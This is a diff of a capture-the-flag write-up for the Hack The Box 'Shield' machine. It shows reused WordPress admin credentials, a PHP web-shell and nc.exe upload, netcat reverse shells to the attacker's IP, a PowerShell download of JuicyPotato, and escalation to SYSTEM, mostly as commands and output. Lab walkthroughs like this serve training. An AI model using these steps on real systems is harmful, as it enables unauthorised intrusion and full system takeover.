@@ -14,7 +14,6 @@
     |_http-title: IIS Windows Server
     3306/tcp open  mysql   MySQL (unauthorized)
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
 // Nvigating to http://10.10.10.29/ didnt give us much 
 // execpt the fact its Windows IIS server(what we already know from nmap)
 
@@ -65,7 +64,6 @@
     301        2l       10w      169c http://10.10.10.29/wordpress/wp-includes/text
     301        2l       10w      167c http://10.10.10.29/wordpress/wp-includes/JS
     301        2l       10w      172c http://10.10.10.29/wordpress/wp-includes/js/dist
-
 // i tried another tool (dirsearch) 
 
     $ python3 dirsearch.py -u http://10.10.10.29/ -t 200
@@ -87,7 +85,6 @@
     [21:35:59] 301 -    0B  - /Wordpress/  ->  http://10.10.10.29/wordpress/
     [21:36:53] 200 -    3KB - /wordpress/wp-login.php
     [21:36:55] 200 -   24KB - /wordpress/
-
 // its seems we have wordpress CMS on the server and login page to Wordpress at http://10.10.10.29/wordpress/wp-login.php
 // since we have credentials of admin:P@s5w0rd! from last box(Vaccine) lets try it using MetaSploit
 
@@ -131,11 +128,180 @@
     [*] Shutting down Meterpreter...
 
 // for some reason metasploit didnt get me a stable shell to work, Navigating to http://10.10.10.29/wordpress/wp-login.php
- we ebale to connect with credentials admin:P@s5w0rd! , after login we will click: >> Appearance >> Theme Editor >> Twenty seventeen (drop down menu)
-
+ we ebale to connect with credentials admin:P@s5w0rd! , after login we will click: >> Appearance >> Themes >> Add New 
 ![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Shield/1.png)
 
+// The we have the option to upload theme, but first get nc.exe and bind shell php script
+
+    $ cp /usr/share/webshells/php/simple-backdoor.php simple-backdoor.php
+    $ cp /usr/share/windows-resources/binaries/nc.exe nc.exe
+    $ ls
+    nc.exe              simple-backdoor.php
+// Browse for the file and click Install Now to upload
 ![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Shield/2.png)
+
+// should output:
+
+    Installing Theme from uploaded file: nc.exe
+
+    Unpacking the package…
+
+    The package could not be installed. PCLZIP_ERR_BAD_FORMAT (-10) : Unable to find End of Central Dir Record signature
+// Lets test simple-backdoor.php fil, Nvigate to http://10.10.10.29/wordpress/wp-content/Uploads/simple-backdoor.php?cmd=dir
+
+     Volume in drive C has no label.
+     Volume Serial Number is DA1D-61AB
+
+     Directory of C:\inetpub\wwwroot\wordpress\wp-content\Uploads
+
+    07/31/2021  10:55 PM    
+              .
+    07/31/2021  10:55 PM    
+              ..
+    02/10/2020  04:07 AM            18,093 black-shield-shape-drawing-illustration-png-clip-art-150x150.png
+    02/10/2020  04:07 AM            20,083 black-shield-shape-drawing-illustration-png-clip-art-273x300.png
+    02/10/2020  04:07 AM           254,028 black-shield-shape-drawing-illustration-png-clip-art-768x844.png
+    02/10/2020  04:07 AM            11,676 black-shield-shape-drawing-illustration-png-clip-art.png
+    02/10/2020  04:07 AM            23,065 cropped-black-shield-shape-drawing-illustration-png-clip-art-150x150.png
+    02/10/2020  04:07 AM            36,889 cropped-black-shield-shape-drawing-illustration-png-clip-art.png
+    07/31/2021  10:53 PM            59,392 nc.exe
+    07/31/2021  10:55 PM               328 simple-backdoor.php
+                   8 File(s)        423,554 bytes
+                   2 Dir(s)  27,552,751,616 bytes free
+// it worked! and we can see our nc.exe file there
+
+// Now we can test our nc.exe file, First we need to open a listiner
+
+    $ rlwrap nc -lvnp 1444
+    listening on [any] 1444 ...
+
+// Navigate in browser to http://10.10.10.29/wordpress/wp-content/Uploads/simple-backdoor.php?cmd=.\nc.exe%20-e%20cmd.exe%2010.10.16.7%201444 (Change 10.10.16.7 and 1444 to your ip and port!!!)
+
+// We got shell !
+
+    $ rlwrap nc -lvnp 1444
+    listening on [any] 1444 ...
+    connect to [10.10.16.7] from (UNKNOWN) [10.10.10.29] 49875
+    Microsoft Windows [Version 10.0.14393]
+    (c) 2016 Microsoft Corporation. All rights reserved.
+
+    C:\inetpub\wwwroot\wordpress\wp-content\Uploads>
+// trying to catch the flag i blocked to get inside users directory duo permissions
+
+    C:\Users> dir
+     Volume in drive C has no label.
+     Volume Serial Number is DA1D-61AB
+
+     Directory of C:\Users
+
+    02/10/2020  02:46 PM    <DIR>          .
+    02/10/2020  02:46 PM    <DIR>          ..
+    02/07/2020  04:43 AM    <DIR>          Administrator
+    11/20/2016  06:24 PM    <DIR>          Public
+    02/13/2020  10:50 AM    <DIR>          sandra
+                   0 File(s)              0 bytes
+                   5 Dir(s)  27,552,727,040 bytes free
+
+    C:\Users>cd sandra
+    Access is denied.
+#### ----- Privilliges Escalation ------
+
+// Checking for privilleges we have 
+
+    C:\Users> whoami
+    nt authority\iusr
+
+    C:\Users> whoami /priv
+
+    PRIVILEGES INFORMATION
+    ----------------------
+
+    Privilege Name          Description                               State  
+    ======================= ========================================= =======
+    SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+    SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+    SeCreateGlobalPrivilege Create global objects                     Enabled
+// we can see that we have SeImpersonate Privilege enabled, it means we can use JuicyPotato to gain permissions.
+// JuicyPotato its exploit file that allows service accounts on Windows to escalate to SYSTEM by leveraging BITS 
+
+    $ mv JuicyPotato.exe jcyp.exe
+// open python http server
+
+    $ python3 -m http.server 1445
+    Serving HTTP on 0.0.0.0 port 1445 (http://0.0.0.0:1445/) ...
+// and download the file in targeted machine using PowerShell
+
+    C:\inetpub\wwwroot\wordpress\wp-content\uploads> Powershell -c "IWR -useBasicParsing http://10.10.16.7:1445/jcyp.exe -o jcyp.exe"
+// in JuicyPotato Docomentation (https://github.com/ohpe/juicy-potato) we can see that JuicyPotato need a .bat file to run
+// run the following command to make shell.bat file:
+
+    C:\inetpub\wwwroot\wordpress\wp-content\uploads> echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.16.7 1445 > shell.bat
+    C:\inetpub\wwwroot\wordpress\wp-content\uploads> dir
+     Volume in drive C has no label.
+     Volume Serial Number is DA1D-61AB
+
+     Directory of C:\inetpub\wwwroot\wordpress\wp-content\uploads
+
+    07/31/2021  11:23 PM    <DIR>          .
+    07/31/2021  11:23 PM    <DIR>          ..
+    02/10/2020  04:07 AM            18,093 black-shield-shape-drawing-illustration-png-clip-art-150x150.png
+    02/10/2020  04:07 AM            20,083 black-shield-shape-drawing-illustration-png-clip-art-273x300.png
+    02/10/2020  04:07 AM           254,028 black-shield-shape-drawing-illustration-png-clip-art-768x844.png
+    02/10/2020  04:07 AM            11,676 black-shield-shape-drawing-illustration-png-clip-art.png
+    02/10/2020  04:07 AM            23,065 cropped-black-shield-shape-drawing-illustration-png-clip-art-150x150.png
+    02/10/2020  04:07 AM            36,889 cropped-black-shield-shape-drawing-illustration-png-clip-art.png
+    07/31/2021  11:17 PM           347,648 jcyp.exe
+    07/31/2021  10:53 PM            59,392 nc.exe
+    07/31/2021  11:23 PM                97 shell.bat
+    07/31/2021  10:55 PM               328 simple-backdoor.php
+                  10 File(s)        771,299 bytes
+                   2 Dir(s)  27,551,789,056 bytes free
+
+    C:\inetpub\wwwroot\wordpress\wp-content\uploads> type shell.bat
+    START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.16.7 1445 
+// now open a listiner
+
+    $ rlwrap nc -lvnp 1445
+    listening on [any] 1445 ...
+
+// run the following command for activate JuicyPotato embeded with the shell.bat file
+
+    C:\inetpub\wwwroot\wordpress\wp-content\uploads> .\jcyp.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e cmd.exe 10.10.16.7 1445" -t *
+    .\jcyp.exe -l 1337 -p C:\windows\system32\cmd.exe -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e cmd.exe 10.10.16.7 1445" -t *
+    Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+    COM -> recv failed with error: 10038
+// i get EROOR, checking this u can find other '-c' parameters(CLSID) in https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2016_Standart
+
+    C:\inetpub\wwwroot\wordpress\wp-content\uploads> .\jcyp.exe -t * -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
+    .\jcyp.exe -t * -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
+    Testing {0134A8B2-3407-4B45-AD25-E9F7C92A80BC} 1337
+    ......
+    [+] authresult 0
+    {0134A8B2-3407-4B45-AD25-E9F7C92A80BC};NT AUTHORITY\SYSTEM
+
+    [+] CreateProcessWithTokenW OK
+
+// And we got a Shell !
+
+    $ rlwrap nc -lvnp 1445
+    listening on [any] 1445 ...
+    connect to [10.10.16.7] from (UNKNOWN) [10.10.10.29] 49923
+    Windows PowerShell 
+    Copyright (C) 2016 Microsoft Corporation. All rights reserved.
+
+    PS C:\Windows\system32>  whoami
+    nt authority\system
+
+
+// We got root.txt
+
+    PS C:\Users\administrator\Desktop>  type root.txt
+    6e9a9fd..................
+
+
+
+
+
 
 Access ID | Name | Email
 ----------|------|-------
